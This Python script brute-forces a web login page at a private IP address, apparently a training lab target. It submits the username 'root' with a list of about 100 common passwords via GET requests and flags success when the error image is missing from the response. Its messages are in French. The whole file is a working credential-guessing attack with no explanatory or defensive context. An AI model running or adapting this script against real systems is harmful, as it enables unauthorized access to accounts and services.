import requests
import time

base_url = "http://10.13.248.97/"

username = "root"

passwords = [
    "123456", "password", "12345678", "qwerty", "123456789", 
    "12345", "1234", "111111", "1234567", "dragon",
    "123123", "baseball", "abc123", "football", "monkey",
    "letmein", "696969", "shadow", "master", "666666",
    "qwertyuiop", "123321", "mustang", "1234567890", "michael",
    "654321", "pussy", "superman", "1qaz2wsx", "7777777",
    "fuckyou", "121212", "000000", "qazwsx", "123qwe",
    "killer", "trustno1", "jordan", "jennifer", "zxcvbnm",
    "asdfgh", "hunter", "buster", "soccer", "harley",
    "batman", "andrew", "tigger", "sunshine", "iloveyou",
    "fuckme", "2000", "charlie", "robert", "thomas",
    "hockey", "ranger", "daniel", "starwars", "klaster",
    "112233", "george", "asshole", "computer", "michelle",
    "jessica", "pepper", "1111", "zxcvbn", "555555",
    "11111111", "131313", "freedom", "777777", "pass",
    "fuck", "maggie", "159753", "aaaaaa", "ginger",
    "princess", "joshua", "cheese", "amanda", "summer",
    "love", "ashley", "6969", "nicole", "chelsea",
    "biteme", "matthew", "access", "yankees", "987654321",
    "dallas", "austin", "thunder", "taylor", "matrix",
    "admin", "root", "toor", "administrator"
]

print("Démarrage des essais de mots de passe...")

session = requests.Session()

attempt_count = 0
start_time = time.time()

for password in passwords:
    attempt_count += 1
    
    full_url = f"{base_url}?page=signin&username={username}&password={password}&Login=Login"
    
    try:
        response = session.get(full_url)
        
        print(f"Tentative {attempt_count}: {password}", end="")
        
        # Vérification basée sur l'absence du GIF d'erreur
        if "WrongAnswer.gif" in response.text:
            print(" - Échec")
        else:
            elapsed_time = time.time() - start_time
            print("\n" + "=" * 50)
            print(f"SUCCÈS! Mot de passe trouvé: {password}")
            print(f"URL: {full_url}")
            print(f"Nombre de tentatives: {attempt_count}")
            print(f"Temps écoulé: {elapsed_time:.2f} secondes")
            print("=" * 50)
            break
        
        time.sleep(0.1)
    
    except Exception as e:
        print(f" - Erreur: {e}")
        continue

print("\nFin des essais de mots de passe.")